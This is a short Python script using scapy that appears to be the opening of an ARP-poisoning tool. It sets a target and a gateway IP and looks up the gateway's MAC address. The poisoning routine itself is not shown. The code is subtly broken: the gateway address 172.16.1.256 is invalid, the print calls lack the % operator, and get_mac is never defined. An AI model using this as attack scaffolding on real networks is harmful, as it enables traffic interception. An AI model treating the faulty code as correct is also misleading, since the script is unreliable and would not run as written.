from scapy.all import *
import os
import sys
import threading
import signal

interface = 'en1'
target_ip = '172.16.1.71'
gateway_ip = '172.16.1.256'
packet_count = 1000
# Set out interface
conf.iface = interface

# Turnout output
conf.verb = 0
print('[*] Setting up %s' (interface))
gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print('[!!!] Failed to get GateWay MAC. Exiting [!!!]')
    sys.exit(0)
else:
    print('[*] Gateway %s is at %s'(gateway_ip, gateway_mac))
